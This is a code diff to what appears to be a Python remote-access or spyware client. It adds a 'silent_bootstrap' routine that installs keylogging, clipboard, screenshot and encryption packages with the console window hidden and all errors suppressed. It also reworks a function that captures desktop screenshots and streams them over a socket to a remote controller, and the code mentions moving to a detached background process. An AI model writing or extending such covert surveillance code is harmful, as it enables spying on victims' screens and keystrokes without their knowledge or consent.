@@ -13,6 +13,31 @@ import threading
 import subprocess
 import random
 import uuid
+import importlib
+
+def silent_bootstrap():
+    required_packages = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
+    for package in required_packages:
+        try:
+            if package == 'pycryptodome':
+                from Crypto.Cipher import AES
+            elif package == 'Pillow':
+                from PIL import Image
+            else:
+                importlib.import_module(package)
+        except ImportError:
+            try:
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0
+                subprocess.run(
+                    [sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-warn-script-location'],
+                    capture_output=True,
+                    startupinfo=startupinfo,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            except Exception:
+                pass
 
 def get_hwid():
     return "-".join(["{:02x}".format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()
@@ -234,10 +259,22 @@ def capture_desktop_screenshot(client: socket.socket) -> None:
             image.save(jpg_buffer, format='JPEG', quality=60, optimize=True)
             jpg_data = jpg_buffer.getvalue()
             
-            # Send compressed JPEG data with 10-byte fixed-length header
+            # Scale resolution to 0.7x
+            new_width = int(image.width * 0.7)
+            new_height = int(image.height * 0.7)
+            image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
+            
+            # Save as compressed JPEG bytes at 60% quality
+            import io
+            jpg_buffer = io.BytesIO()
+            image.save(jpg_buffer, format='JPEG', quality=60, optimize=True, progressive=False)
+            jpg_data = jpg_buffer.getvalue()
+            
+            # Zero-Padded 10-Byte Header protocol with Verification Footer
             client.sendall(b"IMG_FIXED\n")
-            header = f"{len(jpg_data):010d}".encode('utf-8')
-            client.sendall(header + jpg_data)
+            header = str(len(jpg_data)).zfill(10).encode('utf-8')
+            footer = b"V_PULSE_EOF"
+            client.sendall(header + jpg_data + footer)
             print(f"[+] Desktop screenshot captured and sent ({len(jpg_data)} bytes)")
     except Exception as e:
         error_msg = f"DEPENDENCY_MISSING: mss Pillow\n" if not MSS_AVAILABLE or not PIL_AVAILABLE else str(e)
@@ -673,6 +710,9 @@ def parse_args():
 
 if __name__ == '__main__':
     args = parse_args()
+    
+    # Silent bootstrap before any other operation
+    silent_bootstrap()
 
     if not args.detached:
         print("[*] Transitioning to detached background process...")
